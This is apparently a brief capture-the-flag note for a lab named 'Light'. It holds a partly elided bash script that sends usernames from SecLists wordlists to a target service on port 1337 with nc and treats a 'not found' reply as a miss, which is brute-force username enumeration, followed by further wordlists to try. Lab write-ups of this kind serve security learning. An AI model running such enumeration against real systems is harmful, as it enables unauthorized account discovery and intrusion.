# Light

_**Bash script to brute force the password:**_

```bash
#!/usr/bin/bash

filename="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"

while IFS="" read -r line; do
	# eg. echo smokey | nc <target> 1337
	res=$(echo "$line" | nc -w 1 <target> 1337)

	if [[ "$res" == *"not found"* ]]; then
		# if the substring "not found" is present, means user not found
		...
	else
		# print success message and exit
		...
	fi;

done < "$filename"


```

_**Word-lists to try out**_:

1. /`usr/share/wordlists/seclists/Usernames/Names/names.txt`
2. `/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt`&#x20;
3. `/usr/share/wordlists/seclists/Usernames/Names/femalenames-usa-top1000.txt`
